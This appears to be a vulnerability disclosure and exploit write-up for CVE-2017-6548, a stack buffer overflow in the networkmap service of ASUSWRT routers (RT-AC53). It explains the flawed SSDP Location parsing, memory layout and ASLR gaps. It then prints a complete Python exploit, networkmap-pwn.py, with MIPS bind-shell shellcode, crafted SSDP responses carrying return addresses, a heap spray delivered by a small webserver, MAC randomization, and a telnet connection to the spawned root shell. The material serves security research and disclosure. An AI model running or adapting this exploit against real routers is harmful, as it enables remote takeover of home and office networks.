@@ -1,0 +1,440 @@
+Remote Code Execution
+
+Component: networkmap
+
+CVE: CVE-2017-6548
+
+networkmap is responsible for generating a map of computers connected to the router. It continuously monitors the LAN to detect ARP requests submitted by unknown computers. When a new MAC address appears it will probe the related IP address for running services like printer sharing, http server and also iTunes servers.
+
+This is implemented by sending out multicast SSP discoveries:
+
+M-SEARCH * HTTP/1.1
+HOST: 239.255.255.250:1900
+ST:upnp:rootdevice
+MAN:"ssdp:discover"
+MX:3
+A device can then respond with messages which indicate the location of the iTunes service.
+
+HTTP/1.1 200 OK
+Location:HTTP://host:port/path
+Vulnerability:
+
+The function process_device_repsonse is responsible for parsing the SSDP answer:
+
+                                                                                                                                             
+/************************************************************************************************/
+// process the device response "HTTP/1.1 200 OK"
+int process_device_response(char *msg)
+{
+        char *line, *body, *p;                  // temporary variables
+        char *location = NULL;                  // the LOCATION: header
+        char host[16], port[6];                 // the ip and port of the device
+        ushort destport;                        // the integer type of device port
+        char *data = NULL;                      // the data in packet
+        int http_fd;                            // the http socket fd
+        int nbytes;                             // recv number
+        int i;
+        char *descri = NULL;
+        int len;
+	struct timeval timeout={10, 0};
+
+        //search "\r\n\r\n" or "\r\n" first appear place and judge whether msg have blank.
+        if( (body = strstr(msg, "\r\n\r\n")) != NULL)
+                body +=4;
+        else if ( (body = strstr(msg, "\r\n")) != NULL)
+                body +=2;
+        else
+                return 0;
+                                                                                                                                             
+        p = msg;
+        // find the LOCATION information.
+        while( p!= NULL && p < body)
+        {
+                line = strsep(&p, "\r\n");      //divide up string
+                if((strncmp(line, "LOCATION:", 9) == 0) || (strncmp(line, "Location:", 9) == 0))
+                {
+                        location = strip_chars(&line[9], "\t");
+                        location = strip_chars(&line[9], " ");
+                        break;
+                }
+        }
+        NMP_DEBUG_F("UPnP location=%s\n", location);
+        //fprintf(fp_upnp, "UPnP location=%s\n", location);//Yau                                                                                                                                     
+        // get the destination ip
+        location += 7;
+	i = 0;
+	while( (*location != ':') && (*location != '/')) {
+                host[i] = *location++;
+		i++;
+	}
+        host[i] = '\0';
+        //get the destination port
+        if(*location == ':') {
+            	for(location++, i =0; *location != '/'; i++)
+                	port[i] = *location++;
+            	port[i] = '\0';
+            	destport = (ushort)atoi(port);
+	}
+	else
+		destport = 80;
+It contains multiple buffer overflows in the parsing code for host and port. This stack-based overflow can be used to gain control over networkmap’s control flow by overwriting the saved $pc stored on the stack.
+
+Parsing this message:
+
+HTTP/1.1 200 OK
+Location:HTTP://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/
+will overflow host[16] and lead to $pc being set to 0x41414141 which is a starting point for further exploitation.
+
+Exploitation:
+
+In order to develop a working exploit we gather further information of the system.
+
+General Information:
+
+ASUSWRT is based on Linux which is running on a little endian MIPS CPU. The vulnerable program networkmap gets automatically started when the device boots and additionally gets restarted by the watchdog process if it crashes.
+
+# cat /proc/cpuinfo 
+system type     : MT7620
+processor       : 0
+cpu model       : MIPS 24Kc V5.0
+BogoMIPS        : 386.04
+wait instruction    : yes
+microsecond timers  : yes
+tlb_entries     : 32
+extra interrupt vector  : yes
+hardware watchpoint : yes, count: 4, address/irw mask: [0x0000, 0x0ff8, 0x0ff8, 0x0ff8]
+ASEs implemented    : mips16 dsp
+shadow register sets    : 1
+core            : 0
+VCED exceptions     : not available
+VCEI exceptions     : not available
+
+# ps
+  PID USER       VSZ STAT COMMAND
+    1 admin     3940 S    /sbin/init
+    2 admin        0 SW   [kthreadd]
+    3 admin        0 SW   [ksoftirqd/0]
+    4 admin        0 SW   [kworker/0:0]
+    5 admin        0 SW   [kworker/u:0]
+    6 admin        0 SW<  [khelper]
+    7 admin        0 SW   [sync_supers]
+    8 admin        0 SW   [bdi-default]
+    9 admin        0 SW<  [kintegrityd]
+   10 admin        0 SW<  [kblockd]
+   11 admin        0 SW   [kswapd0]
+   12 admin        0 SW   [fsnotify_mark]
+   13 admin        0 SW<  [crypto]
+   17 admin        0 SW   [mtdblock0]
+   18 admin        0 SW   [mtdblock1]
+   19 admin        0 SW   [mtdblock2]
+   20 admin        0 SW   [mtdblock3]
+   21 admin        0 SW   [mtdblock4]
+   22 admin        0 SW   [mtdblock5]
+   23 admin        0 SW   [kworker/u:1]
+   30 admin        0 SW   [kworker/0:1]
+   41 admin      660 S    hotplug2 --persistent --no-coldplug
+   76 admin     3924 S    console
+   78 admin     1276 S    /sbin/syslogd -m 0 -S -O /tmp/syslog.log -s 256 -l 6
+   80 admin     1276 S    /sbin/klogd -c 5
+   82 admin     1292 S    /bin/sh
+  115 admin        0 SW   [RtmpCmdQTask]
+  116 admin        0 SW   [RtmpWscTask]
+  135 admin        0 SW   [RtmpCmdQTask]
+  136 admin        0 SW   [RtmpWscTask]
+  164 admin     3932 S    /sbin/wanduck
+  168 admin     1128 S    dropbear -p 192.168.1.1:22 -a
+  175 admin     3932 S    wpsaide
+  189 nobody    1056 S    dnsmasq --log-async
+  194 admin     2588 S    avahi-daemon: running [RT-AC53-B8F4.local]
+  196 admin     4112 S    httpd -i br0
+  197 admin     1068 S    /usr/sbin/infosvr br0
+  199 admin     3932 S    watchdog
+  201 admin     2180 S    rstats
+  210 admin     1160 S    lld2d br0
+  211 admin     3932 S    ots
+  224 admin      800 S    miniupnpd -f /etc/upnp/config
+  229 admin     1284 S    /sbin/udhcpc -i vlan2 -p /var/run/udhcpc0.pid -s /tmp/udhcpc -O33 -O249
+  302 admin     1152 S    dropbear -p 192.168.1.1:22 -a
+  303 admin     1300 S    -sh
+  344 admin     1128 S    networkmap
+  359 admin     1280 R    ps
+
+# uname -a
+Linux (none) 2.6.36 #1 Fri Sep 23 12:05:55 CST 2016 mips GNU/Linux
+Memory Map:
+
+networkmap’s memory map is analyzed to continue exploiting the device.
+
+# cat /proc/$(pidof networkmap)/maps
+00400000-0040b000 r-xp 00000000 1f:04 270        /usr/sbin/networkmap
+0041a000-0041b000 rw-p 0000a000 1f:04 270        /usr/sbin/networkmap
+0041b000-0041f000 rwxp 00000000 00:00 0          [heap]
+2b893000-2b894000 rw-p 00000000 00:00 0 
+2b894000-2b89a000 r-xp 00000000 1f:04 828        /lib/ld-uClibc.so.0
+2b89a000-2b8a0000 rw-s 00000000 00:04 0          /SYSV000003e9 (deleted)
+2b8a0000-2b8a4000 rw-s 00000000 00:04 32769      /SYSV000003ea (deleted)
+2b8a9000-2b8aa000 r--p 00005000 1f:04 828        /lib/ld-uClibc.so.0
+2b8aa000-2b8ab000 rw-p 00006000 1f:04 828        /lib/ld-uClibc.so.0
+2b8ab000-2b8d9000 r-xp 00000000 1f:04 258        /usr/lib/libshared.so
+2b8d9000-2b8e8000 ---p 00000000 00:00 0 
+2b8e8000-2b8eb000 rw-p 0002d000 1f:04 258        /usr/lib/libshared.so
+2b8eb000-2b8ed000 rw-p 00000000 00:00 0 
+2b8ed000-2b8ef000 r-xp 00000000 1f:04 235        /usr/lib/libnvram.so
+2b8ef000-2b8ff000 ---p 00000000 00:00 0 
+2b8ff000-2b900000 rw-p 00002000 1f:04 235        /usr/lib/libnvram.so
+2b900000-2b90e000 r-xp 00000000 1f:04 760        /lib/libgcc_s.so.1
+2b90e000-2b91e000 ---p 00000000 00:00 0 
+2b91e000-2b91f000 rw-p 0000e000 1f:04 760        /lib/libgcc_s.so.1
+2b91f000-2b95a000 r-xp 00000000 1f:04 827        /lib/libc.so.0
+2b95a000-2b96a000 ---p 00000000 00:00 0 
+2b96a000-2b96b000 rw-p 0003b000 1f:04 827        /lib/libc.so.0
+2b96b000-2b96f000 rw-p 00000000 00:00 0 
+2b970000-2b97f000 r--s 03eb0000 00:0c 78         /dev/nvram
+7f8a7000-7f8c8000 rwxp 00000000 00:00 0          [stack]
+7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]
+Observations:
+
+Partial ASLR is activated:
+
+Stack address is randomized
+Library addresses are randomized
+Program address is not randomized
+Heap address is not randomized
+There is no Stack-Protector
+
+Both heap and stack are mapped executable
+
+The binary contains almost no gadgets suitable for building a ROP chain
+
+Exploit:
+
+The final exploit consists of the following steps:
+
+Starting a webserver serving shellcode
+Listening for multicast UDP messages send by the router
+Database clearing / crashing: to make the heap layout predictable
+Randomizing MAC address
+Send message: jump to gadget that deletes networkmap’s database and crashes
+networkmap will be restarted
+Spraying heap 1, 2:
+Randomizing MAC address
+Send message: containing the webserver’s IP+port
+networkmap will receive shellcode and store it on the heap
+Starting payload
+Randomize MAC address
+Send message: jump to heap address containing the shellcode
+Connect to opened shell
+For further details check out the full exploit: networkmap-pwn.py (https://bierbaumer.net/networkmap-pwn.py)
+
+Example:
+
+# ./networkmap-pwn.py
+[-] starting webserver
+[-] received SSP discovery
+[-] clearing database and crashing
+[-] received SSP discovery
+[-] spraying heap 1/2
+[-] got shellcode request
+[-] sending shellcode
+[-] received SSP discovery
+[-] spraying heap 2/2
+[-] received SSP discovery
+[-] starting payload
+[-] try to connect to shell
+[-] try to connect to shell
+[+] connected
+Linux (none) 2.6.36 #1 Fri Sep 23 12:05:55 CST 2016 mips GNU/Linux
+[+] pwned
+
+
+
+
+---networkmap-pwn.py---
+#!/usr/bin/env python3
+# ASUSWRT networkmap Remote Code Execution
+# Author: Bruno Bierbaumer
+# Date: 24/02/2017
+# Tested version:
+# RT-AC53 (3.0.0.4.380.6038)
+# CVE: TODO
+
+# Description:
+# networkmap contains a stack-based buffer overflow which can be exploited to run arbitrary code.
+
+
+ROUTER_IP = '192.168.1.1'
+IP = '192.168.1.2'
+INTERACE = 'enp0s31f6'
+
+"""
+ Shellcode adjusted from https://www.exploit-db.com/exploits/13298/
+"""
+
+sc = b"\x41\x41\x04\x28" *1400 #   nops
+#alarm handling
+sc += b"\xff\xff\x04\x28"   #     a0 <- 0                          */
+sc += b"\xbb\x0f\x02\x24"   #     li      v0,4027 ( __alarm )      */
+sc += b"\x0c\x01\x01\x01"   #     syscall    
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+#/alarm
+sc += b"\xe0\xff\xbd\x27"   #     addiu   sp,sp,-32                */
+sc += b"\xfd\xff\x0e\x24"   #     li      t6,-3                    */
+sc += b"\x27\x20\xc0\x01"   #     nor     a0,t6,zero               */
+sc += b"\x27\x28\xc0\x01"   #     nor     a1,t6,zero               */
+sc += b"\xff\xff\x06\x28"   #     slti    a2,zero,-1               */   
+sc += b"\x57\x10\x02\x24"   #     li      v0,4183 ( __NR_socket )  */
+sc += b"\x0c\x01\x01\x01"   #     syscall                          */
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+sc += b"\xff\xff\x50\x30"   #     andi    s0,v0,0xffff             */   
+sc += b"\xef\xff\x0e\x24"   #     li      t6,-17                   */
+sc += b"\x27\x70\xc0\x01"   #     nor     t6,t6,zero               */
+sc += b"\x13\x37\x0d\x24"   #     li      t5,0x3713 (port 0x1337)  */
+sc += b"\x04\x68\xcd\x01"   #     sllv    t5,t5,t6                 */
+sc += b"\xff\xfd\x0e\x24"   #     li      t6,-513                  */
+sc += b"\x27\x70\xc0\x01"   #     nor     t6,t6,zero               */
+sc += b"\x25\x68\xae\x01"   #     or      t5,t5,t6                 */
+sc += b"\xe0\xff\xad\xaf"   #     sw      t5,-32(sp)               */
+sc += b"\xe4\xff\xa0\xaf"   #     sw      zero,-28(sp)             */   
+sc += b"\xe8\xff\xa0\xaf"   #     sw      zero,-24(sp)             */
+sc += b"\xec\xff\xa0\xaf"   #     sw      zero,-20(sp)             */
+sc += b"\x25\x20\x10\x02"   #     or      a0,s0,s0                 */
+sc += b"\xef\xff\x0e\x24"   #     li      t6,-17                   */
+sc += b"\x27\x30\xc0\x01"   #     nor     a2,t6,zero               */
+sc += b"\xe0\xff\xa5\x23"   #     addi    a1,sp,-32                */
+sc += b"\x49\x10\x02\x24"   #     li      v0,4169 ( __NR_bind )    */
+sc += b"\x0c\x01\x01\x01"   #     syscall                          */
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+sc += b"\x25\x20\x10\x02"   #     or      a0,s0,s0                 */
+sc += b"\x01\x01\x05\x24"   #     li      a1,257                   */
+sc += b"\x4e\x10\x02\x24"   #     li      v0,4174 ( __NR_listen )  */   
+sc += b"\x0c\x01\x01\x01"   #     syscall                          */
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+sc += b"\x25\x20\x10\x02"   #     or      a0,s0,s0                 */
+sc += b"\xff\xff\x05\x28"   #     slti    a1,zero,-1               */
+sc += b"\xff\xff\x06\x28"   #     slti    a2,zero,-1               */
+sc += b"\x48\x10\x02\x24"   #     li      v0,4168 ( __NR_accept )  */
+sc += b"\x0c\x01\x01\x01"   #     syscall                          */
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+sc += b"\xff\xff\x50\x30"   #     andi    s0,v0,0xffff             */   
+sc += b"\x25\x20\x10\x02"   #     or      a0,s0,s0                 */
+sc += b"\xfd\xff\x0f\x24"   #     li      t7,-3                    */
+sc += b"\x27\x28\xe0\x01"   #     nor     a1,t7,zero               */
+sc += b"\xdf\x0f\x02\x24"   #     li      v0,4063 ( __NR_dup2 )    */
+sc += b"\x0c\x01\x01\x01"   #     syscall                          */
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+sc += b"\x25\x20\x10\x02"   #     or      a0,s0,s0                 */
+sc += b"\x01\x01\x05\x28"   #     slti    a1,zero,0x0101           */
+sc += b"\xdf\x0f\x02\x24"   #     li      v0,4063 ( __NR_dup2 )    */
+sc += b"\x0c\x01\x01\x01"   #     syscall                          */
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+sc += b"\x25\x20\x10\x02"   #     or      a0,s0,s0                 */
+sc += b"\xff\xff\x05\x28"   #     slti    a1,zero,-1               */   
+sc += b"\xdf\x0f\x02\x24"   #     li      v0,4063 ( __NR_dup2 )    */
+sc += b"\x0c\x01\x01\x01"   #     syscall                          */
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+sc += b"\x50\x73\x06\x24"   #     li      a2,0x7350                */
+sc += b"\xff\xff\xd0\x04"   # LB: bltzal  a2,LB                    */
+sc += b"\x50\x73\x0f\x24"   #     li      t7,0x7350 (nop)          */
+sc += b"\xff\xff\x06\x28"   #     slti    a2,zero,-1               */
+sc += b"\xdb\xff\x0f\x24"   #     li      t7,-37                   */
+sc += b"\x27\x78\xe0\x01"   #     nor     t7,t7,zero               */
+sc += b"\x21\x20\xef\x03"   #     addu    a0,ra,t7                 */
+sc += b"\xf0\xff\xa4\xaf"   #     sw      a0,-16(sp)               */
+sc += b"\xf4\xff\xa0\xaf"   #     sw      zero,-12(sp)             */
+sc += b"\xf0\xff\xa5\x23"   #     addi    a1,sp,-16                */
+sc += b"\xab\x0f\x02\x24"   #     li      v0,4011 ( __NR_execve )  */
+sc += b"\x0c\x01\x01\x01"   #     syscall                          */
+sc += b"/bin/sh";
+
+
+import time
+import struct
+import socket
+import sys
+import os
+import threading
+import socketserver
+import telnetlib
+
+# randomize mac address
+def mac():
+    os.system('macchanger  -A {} > /dev/null'.format(INTERACE))
+
+# setup interface
+os.system('ifconfig {} down; ifconfig {} {} up; route add default gw {}'.format(INTERACE, INTERACE, IP, ROUTER_IP))
+
+
+# setup minimal webserver for delivering the shellcode
+class ThreadedHTTPRequestHandler(socketserver.BaseRequestHandler):
+
+    def handle(self):
+        print('[-] got shellcode request')
+        self.request.recv(1024)
+        print("[-] sending shellcode")
+        self.request.send(sc)
+
+class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
+    pass
+
+print('[-] starting webserver')
+socketserver.TCPServer.allow_reuse_address = True
+server = ThreadedHTTPServer(('0.0.0.0', 1337), ThreadedHTTPRequestHandler)
+t = threading.Thread(target=server.serve_forever)
+t.start()
+
+# start multicast receiver
+addrinfo = socket.getaddrinfo('239.255.255.250', None)[0]
+s = socket.socket(addrinfo[0], socket.SOCK_DGRAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('', 1900))
+group_bin = socket.inet_pton(addrinfo[0], addrinfo[4][0])
+mreq = group_bin + struct.pack('=I', socket.INADDR_ANY)
+s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+
+mac()
+state = 'clean'
+
+while True:
+    data, sender = s.recvfrom(1500)
+
+    if sender[0] == ROUTER_IP and sender[1] == 1008:
+        print("[-] received SSP discovery")
+
+        data = {}
+        data['clean'] = b'HTTP/1.1 200 OK\r\nLocation:HTTP://' + b'CCCC'*11 + b'\xfc\x8c\x40/' +b'\r\n\r\n'
+        data['pwn']   = b'HTTP/1.1 200 OK\r\nLocation:HTTP://' + b"AAAA"*11 + b'\x04\xd5\x41/' +b'\r\n\r\n'
+        data['heap']  = b'HTTP/1.1 200 OK\r\nLocation:HTTP://' + IP.encode()+ b':1337/A\r\n\r\n'  
+        data['heap2']= data['heap']
+
+        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 
+        sock.sendto(data[state], sender)
+
+        if state == 'pwn':
+            print("[-] starting payload")
+            while True:
+                try:
+                    print("[-] try to connect to shell")
+                    telnet = telnetlib.Telnet()
+                    telnet.open('192.168.1.1', 0x1337, timeout=1)
+                    print('[+] connected')
+                    telnet.write(b'uname -a; echo [+] pwned\n')
+                    telnet.interact()
+                except:
+                    pass
+                time.sleep(2.0)
+
+        if state == 'heap2':
+            print("[-] spraying heap 2/2")
+            mac()
+            state = 'pwn'
+
+        if state == 'heap':
+            print("[-] spraying heap 1/2")
+            mac()
+            state = 'heap2'
+
+        if state == 'clean':
+            print('[-] clearing database and crashing')
+            mac()
+            state = 'heap'
+---EOF---
